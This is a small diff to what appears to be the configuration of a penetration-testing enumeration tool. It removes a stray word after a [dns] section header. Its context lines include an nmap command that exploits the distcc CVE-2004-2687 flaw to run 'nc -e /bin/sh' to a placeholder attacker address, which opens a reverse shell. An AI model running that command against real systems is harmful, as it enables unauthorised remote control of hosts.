@@ -65,7 +65,7 @@ service-names = [
         'sudo nmap {target_address} -vv --reason -Pn -sV -p 3632 --script=banner,distcc-cve2004-2687 --script-args=distcc-cve2004-2687.cmd="nc -e /bin/sh <Attacker IP Address> 443"'
     ]
 
-[dns]Attacker
+[dns]
 
 service-names = [
     '^domain'
